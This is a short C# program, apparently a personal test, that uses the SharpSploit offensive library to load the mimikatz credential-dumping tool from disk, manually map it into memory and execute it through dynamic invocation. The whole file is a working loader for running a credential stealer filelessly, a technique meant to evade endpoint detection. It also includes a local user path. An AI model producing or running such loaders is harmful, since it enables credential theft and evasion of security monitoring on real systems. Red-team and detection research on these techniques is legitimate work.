using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SharpSploit;
using SharpSploit.Execution.ManualMap;

namespace TestLoadDinvoke
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] katzBytes = File.ReadAllBytes(@"c:\Users\gam4e\Documents\GitHub\mimikatz\x64\mimikatz.exe");
            PE.PE_MANUAL_MAP ManMapKatz = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(katzBytes);
            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(ManMapKatz.PEINFO, ManMapKatz.ModuleBase);

            Console.ReadLine();
        }
    }
}
